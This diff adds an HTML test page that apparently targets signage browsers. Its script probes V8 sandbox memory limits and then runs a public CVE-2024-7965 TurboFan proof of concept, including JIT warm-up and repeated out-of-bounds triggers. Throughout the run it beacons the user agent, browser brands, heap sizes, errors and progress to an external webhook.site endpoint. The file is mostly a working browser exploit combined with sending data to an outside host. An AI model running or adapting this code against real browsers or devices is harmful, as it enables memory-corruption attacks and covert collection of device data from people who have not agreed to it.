@@ -1,0 +1,97 @@
+<html><body><script>
+// t1: sandbox verdict + CVE-2024-7965 re-run, single render (signage = boot-load only)
+// token: 522dfddb
+var SINK = 'https://webhook.site/522dfddb-d0de-45cf-b1df-0346bfd699d2';
+function beacon(t, v){
+  try { fetch(SINK + '?t=' + encodeURIComponent(t) + '&v=' + encodeURIComponent(String(v).slice(0,180)), {mode:'no-cors'}); } catch(e) {}
+  try { new Image().src = SINK + '/i?t=' + encodeURIComponent(t); } catch(e) {}
+}
+window.onerror = function(m,s,l,c){ beacon('jserr', String(m).slice(0,120) + ' @' + l + ':' + c); return false; };
+beacon('start', (navigator.userAgent || '').slice(0,110));
+beacon('ver', (navigator.userAgentData && navigator.userAgentData.brands ? JSON.stringify(navigator.userAgentData.brands).slice(0,120) : 'n/a'));
+
+// ---- part A: sandbox probe (ArrayBuffer cap 32GB when V8 sandbox is enabled) ----
+function sb(n, fn){ try { var r = fn(); beacon('sb-' + n, 'SUCCESS len=' + r); } catch(e){ beacon('sb-' + n, e.name + ':' + String(e.message).slice(0,70)); } }
+sb('33GB', function(){ return new ArrayBuffer(33 * 1024 * 1024 * 1024).byteLength; });
+sb('16GB', function(){ return new ArrayBuffer(16 * 1024 * 1024 * 1024).byteLength; });
+sb('1TB',  function(){ return new ArrayBuffer(2 ** 40).byteLength; });
+try { beacon('heap', JSON.stringify({limit: performance.memory ? performance.memory.jsHeapSizeLimit : -1, total: performance.memory ? performance.memory.totalJSHeapSize : -1})); } catch(e){ beacon('heap','n/a'); }
+try { var wm = new WebAssembly.Memory({initial: 1}); wm.grow(100); beacon('wasm', 'grow-ok pages=' + (wm.buffer.byteLength / 65536)); } catch(e){ beacon('wasm', String(e).slice(0,80)); }
+beacon('A-done', 'probe-complete');
+
+// ---- part B: CVE-2024-7965 PoC for arm64 devices by phoen1xxx (verbatim) ----
+var arrx = new Array(150);
+arrx[0] = 1.1;
+
+var fake = new Uint32Array(10);
+fake[0]= 1; fake[1] =3; fake[2]=2; fake[3] = 4; fake[4] = 5; fake[5] = 6; fake[6] = 7; fake[7] = 8; fake[8] = 9;
+
+var tahir = 0x1;
+
+function poc(a) {
+  var oob_array = new Array(5);
+  oob_array[0] = 0x500;
+  let just_a_variable = fake[0];
+  let another_variable3 = fake[7];
+  if(a % 7 == 0)
+    another_variable3 = 0xff00000000; //spray high bytes
+  another_variable3 = Math.max(another_variable3,tahir);
+  another_variable3 = another_variable3 >>> 0;
+  var index = fake[3];
+  var for_phi_modes = fake[6];
+  let c = fake[1];
+  //giant loop for generate cyclic graph
+  for(var i =0;i<10;i++) {
+    if( a % 3 == 0){
+      just_a_variable = c;
+    }
+    if( a % 37 == 0) {
+      just_a_variable = fake[2];
+    }
+    if( a % 11 == 0){
+      just_a_variable = fake[8];
+    }
+    if( a % 17 == 0){
+      just_a_variable = fake[5];
+    }
+    if( a % 19 == 0){
+      just_a_variable = fake[4];
+    }
+    if( a % 7 == 0 && i>=5){
+      for_phi_modes = just_a_variable;
+      just_a_variable = another_variable3;
+    }
+    if(i>=6){
+      for(let j=0;j<5;j++){
+        if(a % 5 == 0) {
+          index = for_phi_modes;
+          oob_array[index] = 0x500; //zero extends before getting value
+        }
+      }
+    }
+    for_phi_modes = c;
+    c = just_a_variable;
+  }
+  //zero extend
+  return [index,BigInt(just_a_variable)];
+}
+
+for(let i = 2; i<0x500;i++) {
+  poc(i); //compile using turbofan
+}
+
+poc(7*5);
+
+beacon('B-stage', 'warm-done');
+// extra deep warm-up to force TF tier-up without Maglev
+for (let i = 0; i < 50000; i++) { poc(i % 500 + 2); }
+beacon('B-stage', 'warm50k-done');
+let triggers = [35, 70, 105, 140, 175, 35*11, 7*5*19];
+beacon('B-firing', 'n=' + triggers.length);
+for (let t = 0; t < triggers.length; t++) {
+  beacon('B-fire', 'a=' + triggers[t]);
+  poc(triggers[t]);
+}
+beacon('B-survived', 'no-crash after all triggers');
+beacon('done', 't1-complete');
+</script></body></html>
